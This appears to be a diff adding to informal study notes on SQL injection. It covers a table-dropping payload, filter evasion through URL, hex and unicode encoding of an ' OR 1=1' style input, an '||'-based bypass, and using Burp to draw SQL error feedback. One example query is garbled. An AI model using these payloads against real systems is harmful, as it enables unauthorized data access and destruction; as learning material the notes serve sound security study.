@@ -12,3 +12,30 @@ however, we could craft a particular ssn number in order to trip the system out:
 we could also do something like:
 
 12345'; DROP TABLE hello;--
+
+
+Character encoding:
+sometimes, we can use character encoding in order to bypass filters.
+' OR 1=1--
+can be encoded as:
+%27%20OR%201%3D1--
+
+this might help it pass through initial web application filters, which could make a huge difference.
+(this is url encoding, we will now go onto hexadecimal encoding)
+
+SELECT * FROM users WHERE name = 'admin'
+SELECT * FROM users WHERE name = 0x61646d696e
+
+We could also encode character sequences within unicode:
+
+\u0061\u0064\u006d\u0069\u006e (this is admin)
+
+you could also use the bitwise or operator:
+Intro to PHP' || 1=1 --+
+
+a query to find a certain book would be:
+SELECT * FROM books WHERE book_name = 'Intro to PHP' 1=1'
+
+if you can get any feedback from the SQL server, it usually means you are doing something right.
+
+Sometimes, going into burp and editing the request and then getting burp to return it (do intercept, response to this request) can return some decent SQL feedback.
